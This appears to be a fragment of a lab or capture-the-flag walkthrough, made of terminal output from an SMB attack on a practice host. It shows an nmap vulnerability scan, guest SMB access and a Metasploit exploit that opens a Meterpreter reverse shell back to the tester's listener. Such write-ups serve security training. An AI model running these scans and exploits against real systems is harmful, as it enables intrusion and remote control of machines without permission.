...
|_  System time: 2021-07-09T05:03:44+01:00
| smb-security-mode: 
|   account_used: guest
...
$ sudo nmap -p 445 --script vuln 10.10.10.40
...
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49158) at 2021-07-09 00:03:31 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
